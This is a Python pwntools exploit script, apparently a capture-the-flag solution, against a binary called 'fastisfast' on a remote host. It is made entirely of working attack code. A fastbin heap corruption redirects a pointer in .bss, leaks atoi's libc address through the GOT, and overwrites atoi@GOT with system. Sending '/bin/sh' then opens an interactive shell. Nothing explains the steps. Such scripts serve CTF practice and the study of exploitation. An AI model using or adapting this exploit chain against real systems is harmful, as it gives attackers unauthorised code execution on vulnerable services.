from pwn import *

debug = False
context.log_level = "debug"

if debug:
	s = process('./fastisfast')
	context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(s)[0],'b* 0x400A68\n b* 0x40095F\n b* 0x400A2B')
else:
	s = remote('202.112.51.217', 34123)

def menu():
	s.recvuntil("Your choice : ")
	#s.recvn(0xf8)
def create():
	menu()
	s.sendline("1")
def edit(input):
	menu()
	log.info(input)
	s.sendline("2")
	s.recvuntil("Name:")
	s.sendline(input[0:8])
	s.recvuntil("Age:")
	log.info(input[32:36])
	s.sendline(input[32:36])
	s.recvuntil("Comment:")
	log.info(input[8:31])
	s.sendline(input[8:31])

def dele():
	menu()
	s.sendline("3")
def show():
	menu()
	s.sendline("4")
	s.recvuntil("Name : ")
	buf = s.recvn(8)
	s.recvline()
	s.recvline()
	s.recvline()
	return buf
def diturb():
	menu()
	s.sendline("6")
	s.recvuntil("Invalid choice")

elf = ELF("fastisfast")
libc = ELF("libc-2.23-64.so")
atoi_got = elf.got['atoi']
# leak 

ptr_bss = 0x06020A8
fake_size = 0x31

for i in range(fake_size-4):
	diturb()
create()
dele()
payload = p64(ptr_bss - 16)
for i in range(36-len(payload)):
	payload += '1'
log.info(payload)
edit(payload)
create()
create()
payload2 = p64(atoi_got)
for i in range(36-len(payload2)):
	payload2 += '1'
edit(payload2)
buf = show()[0:6]
while len(buf) < 8:
	buf += '\x00'
raw_input("###########")
atoi = u64(buf)
print "atoi = " + hex(atoi)

if debug:
	system = atoi + 0x7f75b3ce6450 - 0x7f75b3cdb250
else:
	system = atoi + libc.symbols['system'] - libc.symbols['atoi']
payload3 = p64(system)
for i in range(36-len(payload3)):
	payload3 += '1'
edit(payload3)
menu()
s.sendline("/bin/sh")
s.interactive()




